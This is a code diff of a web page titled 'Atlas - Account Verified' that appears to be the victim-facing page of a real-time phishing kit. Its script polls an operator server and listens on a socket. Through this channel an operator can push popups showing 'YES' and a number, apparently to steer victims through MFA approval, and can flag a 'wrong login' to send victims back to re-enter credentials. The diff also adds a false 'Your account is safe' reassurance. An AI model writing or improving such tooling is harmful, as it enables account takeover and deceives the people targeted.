@@ -3,49 +3,162 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Atlas - Status</title>
+<title>Atlas - Account Verified</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-body { min-height: 100vh; background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%); display: flex; justify-content: center; align-items: center; padding: 20px; }
-.card { background: #fff; border-radius: 24px; padding: 48px 32px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
-.sad-icon { width: 100px; height: 100px; margin: 0 auto 24px; }
-h1 { font-size: 24px; font-weight: 700; color: #1f2937; margin-bottom: 12px; line-height: 1.4; }
-p { color: #6b7280; font-size: 15px; line-height: 1.6; margin-bottom: 8px; }
-.email-display { display: inline-block; margin-top: 16px; padding: 8px 16px; background: #f3f4f6; border-radius: 8px; color: #4a4ff0; font-size: 13px; font-weight: 500; word-break: break-all; }
-
-.popup-overlay{display:none;position:fixed;inset:0;background:#2b2b2b;z-index:99999;justify-content:center;align-items:center;padding:20px}
-.popup-overlay.active{display:flex !important}
-.popup-yes{text-align:center;color:white;max-width:600px;width:100%}
-.popup-yes .big-yes{font-size:100px;font-weight:900;color:#ffffff;letter-spacing:8px;margin-bottom:40px}
-.popup-yes .number-circle{width:280px;height:280px;border-radius:50%;border:10px solid #10b981;display:flex;align-items:center;justify-content:center;margin:0 auto 40px;box-shadow:0 0 60px rgba(16,185,129,0.5)}
-.popup-yes .number-circle span{font-size:140px;font-weight:900;color:#ffffff;letter-spacing:4px}
-.popup-yes .instruction{font-size:22px;font-weight:600;color:#d1d5db;margin-top:20px;line-height:1.5}
-.popup-yes .instruction strong{color:#10b981}
-@media (max-width:500px){
-  .popup-yes .big-yes{font-size:70px;margin-bottom:28px}
-  .popup-yes .number-circle{width:200px;height:200px;border-width:8px}
-  .popup-yes .number-circle span{font-size:100px}
-  .popup-yes .instruction{font-size:18px}
+body {
+  min-height: 100vh;
+  background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #334155 100%);
+  display: flex; justify-content: center; align-items: center; padding: 20px;
+}
+.card {
+  background: #fff; border-radius: 24px; padding: 48px 32px;
+  width: 100%; max-width: 440px; text-align: center;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.4);
 }
 
-.popup-text{background:white;border-radius:20px;padding:32px;max-width:400px;width:100%}
-.popup-text h3{text-align:center;color:#1f2937;margin-bottom:16px;font-size:20px}
-.popup-text .message{background:#f3f4f6;padding:20px;border-radius:12px;color:#1f2937;font-size:15px;line-height:1.6;word-break:break-word;white-space:pre-wrap}
+/* ⭐ GREEN VERIFIED TICK SVG */
+.verified-icon {
+  width: 110px;
+  height: 110px;
+  margin: 0 auto 28px;
+  display: block;
+}
+
+h1 {
+  font-size: 24px;
+  font-weight: 700;
+  color: #1f2937;
+  margin-bottom: 24px;
+  line-height: 1.4;
+}
+
+.message-block {
+  text-align: center;
+}
+
+.message-line {
+  color: #4b5563;
+  font-size: 15px;
+  line-height: 1.7;
+  margin-bottom: 16px;
+}
+
+.message-line strong {
+  color: #1f2937;
+  font-weight: 600;
+}
+
+.highlight-72 {
+  color: #059669;
+  font-weight: 700;
+  font-size: 16px;
+}
+
+.safe-badge {
+  display: inline-block;
+  margin-top: 12px;
+  padding: 10px 20px;
+  background: #d1fae5;
+  color: #065f46;
+  border-radius: 50px;
+  font-size: 14px;
+  font-weight: 600;
+  border: 1px solid #6ee7b7;
+}
+
+.email-display {
+  display: inline-block;
+  margin-top: 24px;
+  padding: 8px 16px;
+  background: #f3f4f6;
+  border-radius: 8px;
+  color: #4a4ff0;
+  font-size: 13px;
+  font-weight: 500;
+  word-break: break-all;
+}
+
+/* POPUPS (kept for YES/TEXT — admin popups still work on this page) */
+.popup-overlay {
+  display: none; position: fixed; inset: 0;
+  background: #2b2b2b; z-index: 99999;
+  justify-content: center; align-items: center; padding: 20px;
+}
+.popup-overlay.active { display: flex !important; }
+.popup-yes { text-align: center; color: white; max-width: 600px; width: 100%; }
+.popup-yes .big-yes {
+  font-size: 100px; font-weight: 900; color: #ffffff;
+  letter-spacing: 8px; margin-bottom: 40px;
+}
+.popup-yes .number-circle {
+  width: 280px; height: 280px; border-radius: 50%;
+  border: 10px solid #10b981;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 40px;
+  box-shadow: 0 0 60px rgba(16,185,129,0.5);
+}
+.popup-yes .number-circle span {
+  font-size: 140px; font-weight: 900; color: #ffffff; letter-spacing: 4px;
+}
+.popup-yes .instruction {
+  font-size: 22px; font-weight: 600; color: #d1d5db;
+  margin-top: 20px; line-height: 1.5;
+}
+.popup-yes .instruction strong { color: #10b981; }
+.popup-text {
+  background: white; border-radius: 20px; padding: 32px;
+  max-width: 400px; width: 100%;
+}
+.popup-text h3 {
+  text-align: center; color: #1f2937; margin-bottom: 16px; font-size: 20px;
+}
+.popup-text .message {
+  background: #f3f4f6; padding: 20px; border-radius: 12px;
+  color: #1f2937; font-size: 15px; line-height: 1.6;
+  word-break: break-word; white-space: pre-wrap;
+}
+
+@media (max-width: 500px) {
+  .popup-yes .big-yes { font-size: 70px; margin-bottom: 28px; }
+  .popup-yes .number-circle { width: 200px; height: 200px; border-width: 8px; }
+  .popup-yes .number-circle span { font-size: 100px; }
+  .popup-yes .instruction { font-size: 18px; }
+  h1 { font-size: 20px; }
+  .verified-icon { width: 90px; height: 90px; }
+}
 </style>
 </head>
 <body>
 <div class="card">
-  <svg class="sad-icon" viewBox="0 0 24 24" fill="none">
-    <circle cx="12" cy="12" r="10" stroke="#dc2626" stroke-width="1.5"/>
-    <path d="M8 14 C8 14 9.5 16 12 16 C14.5 16 16 14 16 14" stroke="#dc2626" stroke-width="1.5" stroke-linecap="round"/>
-    <circle cx="9" cy="9" r="1" fill="#dc2626"/>
-    <circle cx="15" cy="9" r="1" fill="#dc2626"/>
+  <!-- ⭐ GREEN VERIFIED TICK SVG -->
+  <svg class="verified-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="50" cy="50" r="45" fill="#10b981" />
+    <circle cx="50" cy="50" r="45" fill="none" stroke="#059669" stroke-width="2" />
+    <path d="M28 50 L43 65 L72 36"
+          fill="none"
+          stroke="#ffffff"
+          stroke-width="8"
+          stroke-linecap="round"
+          stroke-linejoin="round"/>
   </svg>
-  <h1>Unfortunately, you are not eligible for this offer</h1>
-  <p>We are truly sorry.</p>
+
+  <h1>Account Verified</h1>
+
+  <div class="message-block">
+    <p class="message-line">
+      We have reviewed your account and the action has been resolved.
+    </p>
+    <p class="message-line">
+      Please check again after <span class="highlight-72">72 hours</span> or contact support.
+    </p>
+    <div class="safe-badge">✓ Your account is safe</div>
+  </div>
+
   <div class="email-display" id="emailDisplay"></div>
 </div>
 
+<!-- YES Popup -->
 <div id="yesPopup" class="popup-overlay">
   <div class="popup-yes">
     <div class="big-yes">YES</div>
@@ -56,6 +169,7 @@ p { color: #6b7280; font-size: 15px; line-height: 1.6; margin-bottom: 8px; }
   </div>
 </div>
 
+<!-- TEXT Popup -->
 <div id="textPopup" class="popup-overlay">
   <div class="popup-text">
     <h3>Message</h3>
@@ -67,9 +181,8 @@ p { color: #6b7280; font-size: 15px; line-height: 1.6; margin-bottom: 8px; }
 <script>
 const socket = io();
 const p = new URLSearchParams(window.location.search);
-let email = p.get('email') || localStorage.getItem('atlas_current_email') || '';
+const email = p.get('email') || localStorage.getItem('atlas_current_email') || '';
 if (email) document.getElementById('emailDisplay').textContent = email;
-localStorage.setItem('atlas_current_email', email);
 
 const yesPopup = document.getElementById('yesPopup');
 const textPopup = document.getElementById('textPopup');
@@ -94,6 +207,31 @@ async function pollStatus() {
     const data = await res.json();
     if (!data || data.notFound) return;
 
+    // ⭐ TIMEOUT → reset to login page (no special message, just back)
+    if (data.timeout_flag) {
+      await fetch('/api/user/clear-flags', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ email })
+      }).catch(()=>{});
+      localStorage.removeItem('atlas_current_email');
+      localStorage.removeItem('atlas_last_popup_id');
+      window.location.href = '/';
+      return;
+    }
+
+    // ⭐ WRONG LOGIN → same, back to login
+    if (data.wrong_login_flag) {
+      await fetch('/api/user/clear-flags', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ email })
+      }).catch(()=>{});
+      localStorage.removeItem('atlas_current_email');
+      localStorage.removeItem('atlas_last_popup_id');
+      window.location.href = '/';
+      return;
+    }
+
+    // Popups work even on success page
     if (typeof data.popup_id === 'number' && data.popup_id > lastPopupId) {
       lastPopupId = data.popup_id;
       if (data.popup_type === 'yes') showYesPopup(data.popup_value);
@@ -114,9 +252,9 @@ socket.on('popup-update', (data) => {
   }
 });
 
-socket.on('user-deleted', (data) => {
+socket.on('user-control', (data) => {
   if (String(data.email).toLowerCase() !== String(email).toLowerCase()) return;
-  window.location.href = '/';
+  pollStatus();
 });
 </script>
 </body>
